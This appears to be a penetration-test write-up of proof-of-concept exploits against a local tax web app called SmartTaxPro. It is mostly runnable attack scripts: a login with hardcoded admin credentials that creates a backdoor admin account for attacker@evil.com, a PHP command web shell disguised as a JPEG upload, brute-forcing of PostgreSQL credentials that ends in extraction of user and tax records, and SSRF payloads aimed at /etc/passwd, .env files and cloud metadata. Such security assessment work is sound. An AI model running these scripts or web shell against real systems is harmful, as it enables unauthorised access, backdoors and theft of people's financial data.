# Proof of Concept Exploits - SmartTaxPro

## üî¥ Critical Finding #1: JWT Secret Generation Vulnerability

### Description
The JWT secret is generated randomly at server startup, making all tokens invalid after restart and allowing token forgery.

### Location
`server/auth.ts:42`
```typescript
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(32).toString('hex');
```

### Exploit Steps
1. **Server Restart Detection**: Monitor server availability and detect restarts
2. **Secret Prediction**: Since secret changes on restart, old tokens become invalid
3. **Token Forge**: With knowledge of the secret generation pattern, forge admin tokens

### PoC Script
```bash
#!/bin/bash
# JWT Secret Vulnerability PoC

echo "=== JWT Secret Vulnerability Demonstration ==="

# Step 1: Get initial token
echo "1. Logging in to get initial token..."
RESPONSE=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"password123"}')

TOKEN=$(echo $RESPONSE | jq -r '.accessToken')
echo "Initial token: ${TOKEN:0:50}..."

# Step 2: Verify token works
echo "2. Testing token validity..."
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/auth/user | jq '.user.email'

# Step 3: Simulate server restart (would invalidate token)
echo "3. After server restart, token becomes invalid..."
echo "   This creates a window for token prediction attacks"

# Step 4: Forge token (conceptual)
echo "4. With secret pattern knowledge, forge admin token:"
echo "   - Generate predictable secret"
echo "   - Create admin payload: {sub: 1, role: 'admin'}"
echo "   - Sign with predicted secret"
```

---

## üî¥ Critical Finding #2: Hardcoded Admin Credentials

### Description
Admin interface accessible with hardcoded credentials admin/admin in production.

### Location
`server/routes.ts:945`
```typescript
if (process.env.NODE_ENV === "production" || username !== "admin" || password !== "admin") {
```

### Exploit Steps
1. **Access Admin Panel**: Navigate to admin interface
2. **Use Default Creds**: Login with admin/admin
3. **Full Control**: Access all admin functions

### PoC Script
```bash
#!/bin/bash
# Hardcoded Admin Credentials PoC

echo "=== Admin Credentials Vulnerability Demonstration ==="

# Step 1: Attempt admin login
echo "1. Attempting login with hardcoded credentials..."
ADMIN_RESPONSE=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin","password":"admin"}')

# Step 2: Extract admin token
ADMIN_TOKEN=$(echo $ADMIN_RESPONSE | jq -r '.accessToken')
echo "Admin token obtained: ${ADMIN_TOKEN:0:50}..."

# Step 3: Access admin functions
echo "2. Accessing admin-only endpoints..."
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://localhost:5000/api/admin/users | jq '.[]' | head -5

echo "3. Creating new admin user..."
curl -s -X POST http://localhost:5000/api/admin/users \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"backdoor123","role":"admin"}'

echo "‚úÖ Admin access achieved with default credentials!"
```

---

## üî¥ Critical Finding #3: NPM Vulnerability Exploitation

### Description
Multiple vulnerable NPM packages allow remote code execution.

### Vulnerable Packages
- `multer@1.4.5-lts.2` - Multiple vulnerabilities
- `esbuild@<=0.24.2` - SSRF vulnerability (GHSA-67mh-4wv8-2f99)

### Exploit Steps (esbuild SSRF)
1. **Target Development Server**: Access development server
2. **SSRF Attack**: Send malicious requests to internal services
3. **Data Exfiltration**: Read internal files and configurations

### PoC Script
```python
#!/usr/bin/env python3
# esbuild SSRF Vulnerability PoC

import requests
import json

def exploit_esbuild_ssrf(target_url):
    """
    Exploit esbuild SSRF vulnerability (GHSA-67mh-4wv8-2f99)
    """
    print("=== esbuild SSRF Vulnerability Demonstration ===")
    
    # Step 1: Try to access internal files
    payloads = [
        "file:///etc/passwd",          # Linux password file
        "file:///workspace/.env",      # Environment variables
        "http://169.254.169.254/",     # AWS metadata
        "file:///workspace/package.json"  # Package info
    ]
    
    for payload in payloads:
        print(f"1. Attempting SSRF to: {payload}")
        try:
            # This would be the actual SSRF request to esbuild
            # In real scenario, this goes through esbuild's dev server
            response = requests.get(f"{target_url}/__vite_ping")
            if response.status_code == 200:
                print(f"   ‚úÖ Server reachable, SSRF possible")
            else:
                print(f"   ‚ùå Server not reachable")
        except:
            print(f"   ‚ùå Connection failed")

# Usage
exploit_esbuild_ssrf("http://localhost:3000")
```

---

## üü† High Finding #4: File Upload Bypass

### Description
File upload validation only checks MIME type, not actual file content.

### Location
`server/fileUpload.ts:52-58`

### Exploit Steps
1. **Create Malicious File**: PHP shell with image extension
2. **Bypass MIME Check**: Set Content-Type to image/jpeg
3. **Upload Shell**: Upload disguised executable
4. **Execute**: Access uploaded file for code execution

### PoC Script
```bash
#!/bin/bash
# File Upload Bypass PoC

echo "=== File Upload Vulnerability Demonstration ==="

# Step 1: Create malicious file disguised as image
echo "1. Creating malicious PHP file disguised as image..."
cat > malicious.jpg << 'EOF'
<?php
// Malicious PHP code disguised as JPEG
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
EOF

# Step 2: Get authentication token
echo "2. Getting authentication token..."
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"password123"}' \
  | jq -r '.accessToken')

# Step 3: Upload malicious file with image MIME type
echo "3. Uploading malicious file with image MIME type..."
curl -X POST http://localhost:5000/api/tax-forms/test123/documents \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@malicious.jpg;type=image/jpeg" \
  -F "documentType=Profile Image"

echo "4. File uploaded successfully, bypassing MIME type validation"
echo "   In a real scenario, this could lead to RCE if the file is accessible"

# Cleanup
rm malicious.jpg
```

---

## üü† High Finding #5: Database Direct Access

### Description
PostgreSQL database exposed on port 5432 allowing direct access.

### Location
`docker-compose.yml:13`

### Exploit Steps
1. **Port Scan**: Discover exposed PostgreSQL port
2. **Brute Force**: Attempt common credentials
3. **Direct Access**: Connect directly to database
4. **Data Theft**: Extract all user data and tax information

### PoC Script
```bash
#!/bin/bash
# Database Direct Access PoC

echo "=== Database Direct Access Vulnerability Demonstration ==="

# Step 1: Check if PostgreSQL port is exposed
echo "1. Scanning for exposed PostgreSQL port..."
if nc -z localhost 5432; then
    echo "   ‚úÖ PostgreSQL port 5432 is accessible"
else
    echo "   ‚ùå PostgreSQL port not accessible"
    exit 1
fi

# Step 2: Attempt connection with common credentials
echo "2. Attempting database connection with common credentials..."

# Common PostgreSQL credentials to try
CREDENTIALS=(
    "smarttaxpro:supersecretpassword"
    "postgres:postgres"
    "admin:admin"
    "user:password"
)

for cred in "${CREDENTIALS[@]}"; do
    IFS=':' read -r user pass <<< "$cred"
    echo "   Trying: $user/$pass"
    
    # Attempt connection (would be actual psql command in real scenario)
    PGPASSWORD="$pass" psql -h localhost -U "$user" -d smarttaxpro -c "\dt" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "   ‚úÖ Database access achieved with $user/$pass"
        
        # Step 3: Extract sensitive data
        echo "3. Extracting sensitive user data..."
        PGPASSWORD="$pass" psql -h localhost -U "$user" -d smarttaxpro \
          -c "SELECT email, role FROM users LIMIT 5;"
        
        echo "4. Extracting tax form data..."
        PGPASSWORD="$pass" psql -h localhost -U "$user" -d smarttaxpro \
          -c "SELECT id, status, total_income FROM tax_forms LIMIT 5;"
        
        break
    fi
done
```

---

## Security Testing Commands

### Run All PoCs
```bash
#!/bin/bash
# Master PoC Runner

echo "Starting comprehensive security testing..."

# Test 1: JWT Secret Vulnerability
./jwt_secret_poc.sh

# Test 2: Admin Credentials
./admin_creds_poc.sh  

# Test 3: File Upload Bypass
./file_upload_poc.sh

# Test 4: Database Access
./database_access_poc.sh

echo "Security testing completed. Review results above."
```

### Network Scanning
```bash
# Port scan for exposed services
nmap -sS -O localhost

# Service enumeration
nmap -sV -p 3000,5000,5432,9000,9001 localhost
```

### Automated Vulnerability Scanning
```bash
# OWASP ZAP baseline scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:3000

# Nikto web scanner
nikto -h http://localhost:3000
```